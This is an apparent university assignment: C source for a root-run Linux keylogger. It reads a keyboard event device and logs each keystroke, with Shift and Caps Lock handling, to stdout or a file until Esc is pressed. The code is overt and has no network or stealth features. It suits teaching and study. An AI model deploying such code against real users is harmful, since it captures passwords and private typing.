/*
 * Linux keylogger
 *
 * HY457
 * Assignment 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>


/* unknown keystroke */
#define UK "UNKNOWN"

/* change it with your keyboard device event number */
#define KEYBOARD "~/dev/input/event3"


/*
 * normal keyboard keystrokes 
 */
const char *
keycodes[] = {
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
	"SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
	"NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
	"F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};

const char *
capital_keycodes[] = {
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "[", "]", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ";", "'", "`", "L_SHIFT", "\\", "Z", "X", "C", "V", "B",
	"N", "M", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
	"SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
	"NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
	"F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};


/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
const char *
shifted_keycodes[] = {
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
	"O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
	"J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
	"N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
	"SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
	"R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
	"F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};

int
isCaps(const char * code)
{
	return strcmp(code,"CAPS_LOCK");
}

/*
 * returns true when the keycode is a Shift (left or right)
 */
bool
isShift(int code)
{
	return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}

int Caps_Active;


/*
 * returns true when the keycode is Esc
 */
bool
isEsc(int code)
{
	return (code == KEY_ESC);
}


/*
 * checks if the user has root privileges
 */
bool
isRoot(void) {
	if (geteuid() != 0) {
		printf("\nMust run it as root, in order to have access "
		    "to the keyboard device\n");
		return false;
	}
	return true;	
}

 
/*
 * prints the usage message
 */
void
usage(void)
{
	printf(
	    "\n"
	    "Usage:\n"
	    "     sudo ./keyloger [ -s | -f file] [-h]\n"
	    "\n"
	    "Options:\n"
	    "  -f    file    Path to the output file.\n"
	    "  -s            Print to stdout.\n"
	    "  -h            This help message.\n"
	);
	exit(EXIT_FAILURE);
}

/*
 * The keylogger's core functionality
 * Takes as argument the keyboard file descriptor
 * You can add more arguments if needed
 */

int caps_active;
int shift_active;
void
keylogger(int keyboard,char* path)
{	


	struct input_event event;
	int rd;
	FILE *fd=NULL;
	if(path)
		fd = fopen(path,"a+");
	
	shift_active=0;
	caps_active=0;
	while (1) {
		
		rd=read(keyboard, (void*)&event, sizeof(event));
		if(event.type==EV_KEY){
			if(event.value==1){
				
				if(isEsc(event.code)){
					break;
				}

				if(isShift(event.code)){
					shift_active++;
				}
				
				if(shift_active<1){	
					if(!isCaps(keycodes[event.code])){
						if(caps_active==0){
							caps_active++;
						} else{
							caps_active--;
						}
					}	
					if(fd&&caps_active==0){
						fprintf(fd,"%s\n",keycodes[event.code]);
					}else if(caps_active==0){
						printf("\n%s",keycodes[event.code]);
					}else if(fd){
						fprintf(fd,"%s\n",capital_keycodes[event.code]);
					}else{
						printf("\n%s",capital_keycodes[event.code]);
					}
				}else	{
					if(fd){
						fprintf(fd,"%s\n",shifted_keycodes[event.code]);
					}else{
							
						printf("\n%s",shifted_keycodes[event.code]);
					}
				}			
				
			}else if(event.value==0){
				if(isShift(event.code)){
					shift_active--;
				}
			}


		}	
	}	
	
	if(fd)
	fclose(fd);

	return;
}


/*
 * main
 */
int
main(int argc, char *argv[])
{
	int opt;
	int root;
	int kb;
	int to_stdout;
	char *output;

	const char * print_all;


	/* init */
	output = NULL;
	to_stdout = 0;


	/* check root */
	root = isRoot();
	if (!root)
		usage();


	/* get options */
	while ((opt = getopt(argc, argv, "f:sh")) != -1) {
		switch (opt) {
		case 'f':
			output = strdup(optarg);
			break;
		case 's':
			to_stdout = 1;
			break;
		case 'h':
		default:
			usage();
		}
	}


	/* Keyboard file descriptor */
	if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
		printf("\nUnable to read from the device\n");
		exit(EXIT_FAILURE);
	}



	keylogger(kb,output);

	printf("\nKeylogger terminated.\n");
	

	/* Close the keyboard file descriptor */
	close(kb);
	

	return 0;
}
